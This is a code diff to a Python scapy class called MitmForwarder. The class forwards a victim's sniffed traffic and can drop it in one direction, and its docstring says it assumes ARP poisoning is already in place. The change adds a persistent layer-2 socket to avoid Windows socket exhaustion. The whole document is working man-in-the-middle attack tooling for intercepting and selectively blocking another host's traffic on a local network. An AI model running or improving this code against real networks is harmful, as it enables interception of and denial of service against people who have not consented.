@@ -1,10 +1,11 @@
-from scapy.all import IP, Ether, sendp, AsyncSniffer
+from scapy.all import IP, Ether, AsyncSniffer, L2Socket
 
 
 class MitmForwarder:
     """
     Simple user-space forwarder that optionally drops traffic in one direction.
     It assumes ARP poisoning is already in place so frames arrive at our NIC.
+    Uses persistent L2 socket to avoid Windows socket exhaustion.
     """
 
     def __init__(self, debug=False):
@@ -20,6 +21,7 @@ class MitmForwarder:
         self._drop_count = 0
         self._fwd_count = 0
         self._debug = debug
+        self._socket = None  # Persistent L2 socket
 
     def start(
         self,
@@ -52,6 +54,16 @@ class MitmForwarder:
             self.running = False
             return
 
+        # Create persistent L2 socket
+        try:
+            self._socket = L2Socket(iface=self.iface)
+            if self._debug:
+                print(f"[forwarder] L2 socket created for {self.iface}")
+        except Exception as e:
+            if self._debug:
+                print(f"[forwarder] Failed to create L2 socket: {e}")
+            self._socket = None
+
         bpf = f"ip and host {self.victim['ip']}"
         if self._debug:
             print(f"[forwarder] Starting on {self.iface}")
@@ -81,6 +93,13 @@ class MitmForwarder:
             except Exception:
                 pass
             self.sniffer = None
+        # Close persistent socket
+        if self._socket:
+            try:
+                self._socket.close()
+            except Exception:
+                pass
+            self._socket = None
         self.running = False
     
     def get_stats(self):
@@ -138,8 +157,14 @@ class MitmForwarder:
             print(f"[forwarder] stats: {self._pkt_count} seen, {self._drop_count} dropped, {self._fwd_count} fwd")
 
     def _send(self, pkt):
+        """Send using persistent socket, prevents Windows socket exhaustion"""
         try:
-            sendp(pkt, iface=self.iface, verbose=0)
+            if self._socket:
+                self._socket.send(pkt)
+            else:
+                # Fallback (shouldn't happen normally)
+                from scapy.all import sendp
+                sendp(pkt, iface=self.iface, verbose=0)
         except Exception:
             pass
 
@@ -157,5 +182,3 @@ class MitmForwarder:
                 del pkt['UDP'].chksum
         except Exception:
             pass
-
-
